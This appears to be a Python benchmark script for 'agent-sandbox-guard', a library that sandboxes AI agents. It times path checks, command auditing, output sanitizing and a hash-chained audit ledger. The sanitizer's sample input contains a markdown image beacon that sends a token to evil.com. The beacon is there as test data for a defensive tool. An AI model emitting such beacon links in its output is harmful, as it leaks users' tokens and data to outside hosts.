"""Performance benchmarks for agent-sandbox-guard."""

import os
import sys
import tempfile
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from agent_sandbox_guard.audit_ledger import AuditLedger
from agent_sandbox_guard.output_sanitizer import OutputSanitizer
from agent_sandbox_guard.path_jailer import PathJailer
from agent_sandbox_guard.subprocess_interceptor import SubprocessInterceptor
from agent_sandbox_guard.types import SandboxPolicy


def run_benchmarks():
    print("================================================================")
    print("        AGENT-SANDBOX-GUARD MICROBENCHMARK SUITE                ")
    print("================================================================")

    policy = SandboxPolicy(
        allowed_read_roots=["/tmp"],
        allowed_write_roots=["/tmp"],
        allowed_commands=["python3", "git", "ls"],
    )

    # 1. Path Jailer Benchmark
    n_iterations = 20_000
    t0 = time.perf_counter()
    for _ in range(n_iterations):
        PathJailer.is_safe_read("/tmp/workspace/src/main.py", policy)
    elapsed = time.perf_counter() - t0
    ops_per_sec = n_iterations / elapsed
    us_per_op = (elapsed / n_iterations) * 1_000_000
    print(f"PathJailer Access Checks:       {ops_per_sec:10.1f} ops/sec ({us_per_op:.2f} µs/op)")

    # 2. Subprocess Interceptor Benchmark
    t0 = time.perf_counter()
    for _ in range(n_iterations):
        SubprocessInterceptor.audit_command("python3 -m pytest tests/ --verbose", policy)
    elapsed = time.perf_counter() - t0
    ops_per_sec = n_iterations / elapsed
    us_per_op = (elapsed / n_iterations) * 1_000_000
    print(f"Subprocess Token & AST Audit:   {ops_per_sec:10.1f} ops/sec ({us_per_op:.2f} µs/op)")

    # 3. Output Sanitizer Benchmark
    sample_text = (
        "Normal response payload from model with some markdown formatting. "
        "![beacon](https://evil.com/leak?token=12345) and more text here.\n" * 10
    )
    payload_bytes = len(sample_text.encode("utf-8"))
    n_san_iterations = 5_000
    t0 = time.perf_counter()
    for _ in range(n_san_iterations):
        OutputSanitizer.sanitize(sample_text, policy)
    elapsed = time.perf_counter() - t0
    total_mb = (payload_bytes * n_san_iterations) / (1024 * 1024)
    mb_per_sec = total_mb / elapsed
    print(f"Output Sanitizer Throughput:    {mb_per_sec:10.2f} MB/sec ({n_san_iterations/elapsed:.1f} ops/sec)")

    # 4. Cryptographic Audit Ledger Benchmark
    ledger = AuditLedger()
    t0 = time.perf_counter()
    for i in range(10_000):
        ledger.record_action(
            agent_id="bench-agent",
            tool_name="read_file",
            operation="READ",
            target=f"/tmp/file_{i}.txt",
            is_allowed=True,
            violations=[],
        )
    elapsed = time.perf_counter() - t0
    ops_per_sec = 10_000 / elapsed
    us_per_op = (elapsed / 10_000) * 1_000_000
    print(f"SHA-256 Chained Audit Ledger:  {ops_per_sec:10.1f} ops/sec ({us_per_op:.2f} µs/op)")

    t0 = time.perf_counter()
    root = ledger.compute_merkle_root()
    merkle_elapsed = (time.perf_counter() - t0) * 1000
    print(f"Merkle Tree Calculation (10k):  {merkle_elapsed:10.2f} ms (Root: {root[:16]}...)")
    print("================================================================")
    print("All benchmarks finished successfully.")


if __name__ == "__main__":
    run_benchmarks()
